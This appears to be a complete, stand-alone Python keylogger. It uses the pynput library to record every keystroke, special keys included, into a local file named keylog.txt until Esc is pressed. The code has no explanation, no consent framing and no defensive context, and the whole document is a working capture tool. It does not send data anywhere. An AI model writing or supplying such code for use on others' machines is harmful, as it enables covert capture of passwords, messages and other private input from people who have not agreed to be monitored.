from pynput import keyboard

# File to store the logged keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Write the key to the file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like shift, ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
